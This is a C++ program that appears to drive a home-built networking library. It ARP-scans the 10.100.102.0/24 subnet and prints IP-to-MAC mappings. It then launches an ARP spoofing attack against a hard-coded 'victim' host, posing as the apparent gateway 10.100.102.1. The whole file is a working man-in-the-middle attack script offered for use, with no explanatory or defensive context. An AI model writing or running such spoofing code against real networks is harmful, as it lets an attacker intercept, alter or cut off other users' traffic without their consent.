#include <iostream>
#include <memory>
#include <ctime>
using namespace std;

#include "lib/linux/linux_iface.h"
#include "lib/linux/linux_iface_net_access.h"
#include "lib/linux/hardware.h"

#include "src/protocols/ether/ethernet2_protocol.h"
#include "src/protocols/arp/arp_header.h"
#include "src/protocols/arp/arp_protocol.h"

#include "src/tools/arp_tool/arp_tool.h"

ip4_addr victim_ip4_addr = str_to_ip4_addr("10.100.102.10").value();
mac_addr victim_mac_addr = str_to_mac_addr("06:ff:6b:13:d2:0c").value();

int main() {
    puts("starting");

    /* network access in linux */
    string iface_name = "enp0s3";
    shared_ptr<linux_iface> iface = make_shared<linux_iface>(iface_name);
    shared_ptr<net_access_bytes> iface_net_access = make_shared<linux_iface_net_access_bytes>(iface);

    /* net access for ethernet broadcast arp */
    shared_ptr<net_access_bytes> net_access_eth_broadcast_arp = make_shared<ethernet2_protocol::net_access_broadcast>(iface_net_access, get_mac_addr_of_iface("enp0s3").value(), ethertype::arp);

    // puts("scanning a single ip");
    // mac_addr res = arp_tool::search_for_mac_addr(net_access_eth_broadcast_arp, str_to_ip4_addr("10.100.102.7").value(), get_mac_addr_of_iface("enp0s3").value(), get_ip_addr_of_iface("enp0s3").value());
    // printf("res: %s\n", mac_addr_to_str(res).c_str());

    string subnet_str = "10.100.102.0/24";
    cout << "scanning the subnet " << subnet_str << endl;
    auto entries = arp_tool::scan_entire_subnet(net_access_eth_broadcast_arp, str_to_ip4_subnet_mask(subnet_str).value(), get_mac_addr_of_iface("enp0s3").value(), get_ip_addr_of_iface("enp0s3").value());
    // auto entries = arp_tool::scan_entire_subnet(ether_to_arp_bridge, str_to_ip4_subnet_mask("10.100.102.0/24").value(), mac_addr_empty, ip4_addr_empty);
    for (auto const& entry : entries) {
        printf("%s is %s\n", ip4_addr_to_str(entry.first).c_str(), mac_addr_to_str(entry.second).c_str());
    }


    /* net access for ethernet single arp */
    shared_ptr<net_access_bytes> net_access_eth_single_arp = make_shared<ethernet2_protocol::net_access_single>(iface_net_access, victim_mac_addr, get_mac_addr_of_iface("enp0s3").value(), ethertype::arp);

    puts("spoofing");
    arp_tool::spoofing_attack(
        // {{net_access_victim, victim_mac_addr, victim_ip4_addr}},
        {{net_access_eth_single_arp, mac_addr_empty, ip4_addr_empty}},
        str_to_ip4_addr("10.100.102.1").value(),
        get_mac_addr_of_iface("enp0s3").value(), get_ip_addr_of_iface("enp0s3").value(),
        true
    );


    /* done */
    cout << "done" << endl;
}
